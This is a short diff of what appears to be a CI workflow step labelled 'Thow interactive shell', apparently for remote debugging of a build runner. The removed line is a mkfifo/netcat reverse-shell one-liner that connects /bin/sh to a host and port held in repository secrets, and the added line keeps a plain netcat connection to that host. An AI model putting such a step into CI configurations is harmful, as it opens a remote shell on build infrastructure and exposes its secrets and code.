@@ -14,4 +14,4 @@ jobs:
       - name: Thow interactive shell
         shell: bash -i {0}
         run: |
-                    rm /tmp/f>/dev/null 2>&1;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${{ secrets.DEBUG_HOST }} ${{ secrets.DEBUG_PORT }} >/tmp/f
+                nc ${{ secrets.DEBUG_HOST }} ${{ secrets.DEBUG_PORT }}
